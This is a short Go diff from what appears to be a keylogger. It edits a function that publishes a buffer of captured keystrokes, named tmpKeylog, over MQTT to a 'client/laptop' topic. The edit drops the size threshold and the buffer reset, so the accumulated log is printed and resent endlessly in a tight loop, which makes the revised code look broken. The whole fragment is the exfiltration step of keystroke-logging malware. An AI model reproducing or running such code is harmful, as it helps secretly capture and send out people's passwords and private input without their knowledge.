@@ -326,14 +326,11 @@ func sendMsg(topic string, payload string, qos byte, retained bool) mqtt.Token{
 func sendLog(){
 	create()
 	for {
-		if len(tmpKeylog) > 100 {
-			fmt.Println(tmpKeylog)
-			token := sendMsg("client/laptop", tmpKeylog, byte(2), false)
-			if token.Error() != nil {
-				fmt.Println(token.Error())
-				os.Exit(1)
-			}
-			tmpKeylog = ""
+		fmt.Println(tmpKeylog)
+		token := sendMsg("client/laptop", tmpKeylog, byte(2), false)
+		if token.Error() != nil {
+			fmt.Println(token.Error())
+			os.Exit(1)
 		}
 	}
 }
